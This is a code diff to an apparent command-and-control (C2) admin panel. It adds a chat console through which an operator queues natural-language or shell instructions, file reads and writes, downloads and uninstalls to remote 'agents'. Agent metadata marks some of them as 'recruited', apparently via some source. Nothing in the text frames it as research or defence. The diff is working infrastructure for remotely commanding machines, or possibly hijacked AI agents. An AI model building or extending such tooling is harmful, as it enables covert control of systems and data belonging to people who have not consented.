@@ -79,9 +79,11 @@ from app.services.c2_service import (
     delete_agent,
     enqueue_task,
     get_agent,
+    get_nl_task_templates,
     get_task_templates,
     list_agents,
     list_tasks,
+    serialize_task_full,
     task_type_stats,
 )
 from app.services.node_runtime import node_detail_bundle, node_listing_with_runtime, queue_node_task
@@ -6488,7 +6490,13 @@ def admin_c2_agent_detail(agent_id: str, request: Request, db: Session = Depends
     tasks = list_tasks(db, agent_id=agent_id, limit=100)
     task_count = agent_task_count(db, agent_id)
     templates = get_task_templates()
+    nl_templates = get_nl_task_templates()
     type_stats = task_type_stats(db, agent_id)
+    metadata = agent.metadata_json or {}
+    is_recruited = bool(metadata.get("recruit_src") or metadata.get("recruited_via"))
+    initial_tasks_json = json.dumps(
+        [serialize_task_full(t) for t in reversed(tasks)], ensure_ascii=False
+    )
     return _render(
         request,
         "admin/c2_agent_detail.html",
@@ -6497,7 +6505,11 @@ def admin_c2_agent_detail(agent_id: str, request: Request, db: Session = Depends
             "tasks": tasks,
             "task_count": task_count,
             "templates": templates,
+            "nl_templates": nl_templates,
             "type_stats": type_stats,
+            "is_recruited": is_recruited,
+            "recruit_src": metadata.get("recruit_src", ""),
+            "initial_tasks_json": initial_tasks_json,
             "user": user,
             "title": f"Agent {agent_id[:12]}",
             "nav_base": "/admin/c2/agents",
@@ -6662,6 +6674,67 @@ def api_admin_c2_tasks(
             for t in tasks
         ]
     }
+
+
+@router.get("/api/admin/c2/agents/{agent_id}/chat")
+def api_admin_c2_agent_chat(agent_id: str, request: Request, db: Session = Depends(get_db)):
+    """Chat-console feed: recent tasks (asc) plus a presence snapshot.
+
+    The console diffs by task id + status + output length, so returning the
+    last 100 tasks unconditionally keeps status transitions (dispatched →
+    completed with output) flowing without extra bookkeeping.
+    """
+    _require_user(request, db)
+    agent = get_agent(db, agent_id)
+    if not agent:
+        return JSONResponse({"error": "agent_not_found"}, status_code=404)
+    tasks = list_tasks(db, agent_id=agent_id, limit=100)
+    tasks_asc = list(reversed(tasks))
+    return {
+        "agent": {
+            "agent_id": agent.agent_id,
+            "status": agent.status,
+            "last_seen_at": agent.last_seen_at.isoformat() if agent.last_seen_at else None,
+            "poll_interval": agent.poll_interval,
+        },
+        "tasks": [serialize_task_full(t) for t in tasks_asc],
+    }
+
+
+@router.post("/api/admin/c2/agents/{agent_id}/chat")
+async def api_admin_c2_agent_chat_send(agent_id: str, request: Request, db: Session = Depends(get_db)):
+    """Send one natural-language (or shell) instruction from the chat console."""
+    user = _require_admin(request, db)
+    agent = get_agent(db, agent_id)
+    if not agent:
+        return JSONResponse({"error": "agent_not_found"}, status_code=404)
+    try:
+        body = await request.json()
+    except Exception:
+        body = {}
+    message = str(body.get("message") or "").strip()
+    task_type = str(body.get("task_type") or "").strip() or "nl_instruct"
+    if task_type not in {"nl_instruct", "cmd", "read_file", "write_file", "download", "uninstall"}:
+        task_type = "cmd"
+    if not message:
+        return JSONResponse({"error": "empty_message"}, status_code=400)
+    task = enqueue_task(
+        db,
+        agent_id=agent_id,
+        task_type=task_type,
+        command=message,
+        created_by=user.username,
+    )
+    log_execution(
+        db,
+        actor_username=user.username,
+        action="send_message",
+        module="c2",
+        target_type="agent",
+        target_ref=agent_id,
+        detail_json={"task_id": task.id, "task_type": task_type},
+    )
+    return {"task": serialize_task_full(task)}
 
 
 @router.get("/api/admin/c2/beacons")
